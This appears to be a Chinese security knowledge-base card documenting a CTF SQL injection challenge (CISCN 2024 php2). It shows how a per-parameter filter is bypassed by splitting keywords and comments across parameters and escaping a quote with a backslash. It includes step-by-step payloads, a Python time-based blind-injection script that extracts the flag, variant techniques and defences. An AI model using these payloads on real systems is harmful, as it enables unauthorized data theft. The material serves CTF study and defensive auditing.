---
id: web-generic-sqli-php-multi-param-concat-backslash-cross-boundary
title: PHP 多参数拼接 SQL 注入：逐参数正则过滤被跨参数拆分绕过 + 反斜杠逃逸单引号，时间盲注读 flag（CISCN 2024 php2）
type: scenario
domain: web
path: web/generic/sqli
technique: php-multi-param-concat-filter-cross-boundary-backslash
aliases:
- CISCN 2024 php2
- chkstr 绕过
- 多参数拼接注入
- 跨参数 SQL 注入
- 反斜杠逃逸单引号
- 注释跨参数闭合
- 时间盲注读 flag
tags:
- sqli
- php
- mysql
- filter-bypass
- multi-parameter
- backslash
- time-blind
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V307
  verified_at: '2026-11-08T11:34:22+08:00'
  notes: 已对照原文源码与图01核对：cf.php chkstr type1 正则与 str_replace 单引号替换、type2 is_numeric、cfstat_visit_last INSERT 拼接 username/ip/ly/webtitle/currweb、第133行 userstate==0 exit（NULL==0 需 username=mytest）、多参数注释/*与*/跨参数、反斜杠吞 ly 闭合引号、时间盲注 if(...sleep(5)) payload 均与卡片一致。dedup 首条命中为卡片自身（已入库），其余候选为 related（单参数 UNION 等），非同链；dup-scan 与本卡 pair 为 related。未实际搭建环境执行 PoC（原文为比赛题解/exp 完整）；CTF 应用无受影响版本区间。
---

## 一句话结论

PHP 应用把多个 GET 参数分别经 `chkstr()` 过滤后拼进同一条 INSERT：正则黑名单只逐参数匹配、单引号只逐参数转义，因此可以用一个参数提供 `\` 吞掉它后面的闭合引号，让相邻参数逃逸成 SQL 语法；再用 `/*`（放在前一个参数）与 `*/`（放在后一个参数）跨参数组成注释，注释掉拼接时插入的引号/逗号与中间参数，最终把 `if(ascii(substr((select flag from flag),n,1))=i,sleep(5),1)` 注入进 VALUES，按响应时间逐字符读出 flag。

## 原理

- **漏洞形态**：`cf.php` 接收 `action/assort/c/username/ly/currweb/webtitle/firstshow/screenwidth/...` 等参数，每个都过 `chkstr($v,1)` 或 `chkstr($v,2)`，随后把 `$username`、`$ip`、`$ly`、`$webtitle`、`$currweb` 直接拼进一条 `insert into cfstat_visit_last (...) values(...)`。没有使用预处理语句，参数值最终成为 SQL 文本的一部分。
- **逐参数过滤为什么可绕**：`chkstr` 在 `$paratype==1` 时用一条正则黑名单匹配**单个参数值**：
  `(and|or)\b.+?(>|<|=|in|like)|/\*.+?\*/|<\s*script\b|\bEXEC\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\s+(TABLE|DATABASE)`，
  然后把单引号替换成两个单引号。由于正则只看到单个参数，SQL 关键字可以被拆到两个参数里：例如 `username` 只含 `',(select`，`ly` 只含 `*/flag from flag,1,1,1);#`，没有任何一个参数单独匹配 `SELECT.+?FROM`；拼成整句后才组成完整注入。
- **跨参数注释**：把 `/*` 放在前一个参数值的末尾、`*/` 放在后一个参数值的开头，SQL 拼接时插入的 `','` 分隔符与中间参数全部落在注释里，从而把两段 SQL 语法接起来。文章最终 payload 中 `select flag/*&currweb=*/from flag` 就是利用 URL 的 `&currweb=` 参数边界，让 `/*` 与 `*/` 分别来自 `webtitle` 和 `currweb`，注释掉中间拼接出来的引号/逗号。
- **反斜杠逃逸单引号**：`ly/webtitle/currweb` 还经过 `htmlspecialchars`（文章环境中会转义单引号），无法直接写 `'`；但 `chkstr` 不转义反斜杠。令 `ly=\`，SQL 中 `'$ly'` 变成 `'\'`：反斜杠把本应闭合 `ly` 的单引号转义掉，字符串继续延伸到下一个参数的地盘，`webtitle` 的值（不含单引号）即可作为 SQL 语法逃逸出来。文章最终 SQL 形如：
  `insert into cfstat_visit_last (...) values(1,'mytest','ly=\',webtitle=',(select flag from flag),1,1,1,1,1,1,1,1);#...`
- **前置条件 username=mytest**：第 133 行先按 `username` 查 `cfstat_user`，若 `$rs['userstate']==0` 则 `exit`；查询无结果时 `$rs['userstate']` 为 NULL，PHP 弱比较 `NULL == 0` 为 true，也会 exit。因此 `username` 必须是一个存在且 `userstate != 0` 的用户（文章用备份数据里的 `mytest`），不能把注入放在 username 上，只能借其他参数。
- **时间盲注**：页面没有回显/报错，注入 `if(ascii(substr((select flag from flag),n,1))=i,sleep(5),1)` 到 VALUES；命中字符时 MySQL 睡眠 5 秒，脚本按响应时间 >5s 判断，逐字符（ASCII 30–128）提取 flag。

## 触发条件

- PHP + MySQL 应用把多个用户可控参数直接拼进同一条 SQL，且过滤函数是“逐参数正则黑名单 + 逐参数引号替换”，没有使用 prepared statement。
- 过滤只针对单个参数，不针对拼接后的完整 SQL；反斜杠未被转义/禁用，且数据库使用 MySQL 默认的 `NO_BACKSLASH_ESCAPES` 关闭状态（反斜杠是转义符）。
- 需要至少一个存在且状态正常的用户名（本例 `mytest`）通过前置查询；否则 `NULL == 0` 会提前 exit。
- 页面无回显/无报错，但可通过 `sleep()` 等时间侧信道观察；或存在其他布尔/报错差异。
- 仅用于授权测试/CTF 环境。

## 利用步骤

1. 审计源码：找到把多个 `$_GET` 参数拼进同一条 SQL 的位置（本例 `cf.php` 的 `insert into cfstat_visit_last ... values(...)`），确认每个参数经过的过滤函数。
2. 读 `chkstr`：type 1 是正则黑名单 + `str_replace("'","''")`；type 2 要求 `is_numeric`；type 3 要求 `strtotime`。确认反斜杠不在过滤范围、htmlspecialchars 会转义单引号。
3. 先正常请求，确认前置查询：`username` 必须是存在的用户（如 `mytest`），否则 `NULL==0` exit；观察响应差异。
4. 构造跨参数注入：`username=mytest&firstshow=1&action=countget_2&ly=\&webtitle=,<SQL 片段>/*&currweb=*/<SQL 片段>);%23`，把 `/*`/`*/` 放在相邻参数边界，反斜杠放在 `ly` 吞掉闭合引号，`#` 注释剩余 SQL。
5. 用时间盲注 payload：`webtitle=,if(ascii(substr((select flag/*&currweb=*/from flag),{n},1))={i},sleep(5),1),1,1,1,1,1,1,1,1);#`；发送后记录响应时间，>5s 表示 `i` 命中，逐字符拼接。
6. 本地复现需自建数据库/flag 数据；比赛环境 flag 在数据库中。脚本对 `num` 1..1000、`i` 30..128 循环，遇 429 时等待重试。

## PoC

```python
import requests, time

url = "http://127.0.0.1:801/php2/www/"
data = ""
data_len = -1

for num in range(1, 1000):
    new_len = len(data)
    if new_len == data_len:
        break
    data_len = new_len
    for i in range(30, 128):
        payload = (
            f"cf.php?username=mytest&firstshow=1&action=countget_2"
            f"&ly=\\&webtitle=,if(ascii(substr((select flag/*&currweb=*/from flag),{num},1))={i},sleep(5),1),1,1,1,1,1,1,1,1);%23"
        )
        t1 = time.time()
        try:
            r = requests.get(url + payload)
        except Exception:
            raise SystemExit("request error")
        t2 = time.time()
        if r.status_code == 429:
            time.sleep(5)
            continue
        if t2 - t1 > 5:
            data += chr(i)
            print(data)
            break

print(data[:-1])
```

## 变体与关联

- 变体：若 `htmlspecialchars` 只转义双引号（旧版 PHP 默认 `ENT_COMPAT`），可直接用单引号闭合，无需反斜杠；若开了 `NO_BACKSLASH_ESCAPES`，反斜杠不再转义引号，需要换宽字节/十六进制等手法。
- 变体：跨参数注释可换成 `-- `、`#` 或 `/**/`；若过滤禁止 `/*`，可用换行/其他注释符或把关键字拆分到更多参数。
- 变体：时间盲注可换成布尔盲注（`and ascii(...)=i`）、报错注入（若页面回显错误）或 UNION（若有回显且列数匹配）。
- 关联：[[web-generic-sqli-backslash-quote-blacklist-hex-union-session-ssti]]（单参数反斜杠转义闭合引号 + 十六进制 UNION）、[[web-generic-sqli-case-sensitive-blacklist-backslash-blind-ascii]]（大小写敏感黑名单 + 反斜杠吞引号盲注）、[[web-generic-sqli-waf-newline-keyword-split-hex]]（关键字插换行拆分正则）、[[web-generic-sqli-keyword-double-write-bypass]]（关键字双写绕过）。

## 检测与防御

- 检测：代码审计关注“多参数拼接同一条 SQL + 逐参数过滤”的模式；WAF 应在拼接后/规范化后检测完整 SQL，而不是分别看每个参数；监控带反斜杠、注释符、`sleep`/`if(` 的请求。
- 防御：使用预处理语句/参数化查询；过滤应在完整 SQL 语义上做，不能只逐参数；统一转义反斜杠与引号并禁用多语句；最小数据库权限（只读账号）；错误关闭不等于安全，时间盲注仍可利用；对 `sleep`/重查询做限速与审计。
- 说明：本文为 CTF 题目（CISCN 2024 华东北赛区 php2）的完整注入链，severity 记为 medium（数据库数据读取）；仅用于授权测试。
